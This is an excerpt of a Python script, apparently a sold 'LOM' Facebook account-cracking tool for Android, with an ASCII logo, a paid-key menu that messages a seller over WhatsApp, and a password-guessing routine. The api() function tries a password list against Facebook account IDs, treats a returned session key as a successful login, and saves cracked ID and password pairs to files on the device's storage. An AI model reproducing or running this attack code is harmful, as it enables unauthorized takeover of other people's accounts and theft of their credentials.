...
logo=("""\033[1;37m
    _      ____  __  __        ____  _____            _   _ _____  
 | |    / __ \|  \/  |      |  _ \|  __ \     /\   | \ | |  __ \ 
 | |   | |  | | \  / |______| |_) | |__) |   /  \  |  \| | |  | |
 | |   | |  | | |\/| |______|  _ <|  _  /   / /\ \ | . ` | |  | |
 | |___| |__| | |  | |      | |_) | | \ \  / ____ \| |\  | |__| |
 |______\____/|_|  |_|      |____/|_|  \_\/_/    \_\_| \_|_____/ 
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801817490964&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi LOM Sir, I Need To Buy Your Paid LOM PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python LOM-NEW.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [LOM-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/LOM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [LOM-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/LOM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
